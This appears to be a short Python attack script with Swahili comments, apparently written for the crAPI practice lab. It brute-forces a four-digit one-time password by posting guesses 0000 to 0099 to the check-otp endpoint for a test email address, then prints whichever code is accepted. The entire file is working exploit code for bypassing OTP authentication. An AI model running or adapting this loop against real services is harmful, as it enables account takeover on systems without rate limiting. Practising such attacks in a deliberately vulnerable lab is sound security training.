import requests

def run_broken_auth(base_url):
    print("\n[*] Inazindua shambulio la OTP Brute Force...")
    target_url = f"{base_url}/identity/api/auth/v1/check-otp"
    
    # Ili kuokoa mda kwenye lab, tutajaribu OTP 100 za mwanzo (0000 hadi 0100)
    for i in range(100):
        otp_guess = f"{i:04d}" # Inatengeneza muundo wa herufi 4 mfano "0005"
        data = {
            "email": "marwan_test@example.com",
            "otp": otp_guess
        }
        
        response = requests.post(target_url, json=data)
        
        # crAPI ikikubali OTP, huwa inarudisha Status Code ya 200 au neno "success"
        if "success" in response.text.lower() or response.status_code == 200:
            print(f"[+] OTP BYPASS IMERANGAZA! OTP Sahihi ni: {otp_guess}")
            return
    print("[-] Majaribio 100 yameisha bila kupata OTP sahihi.")

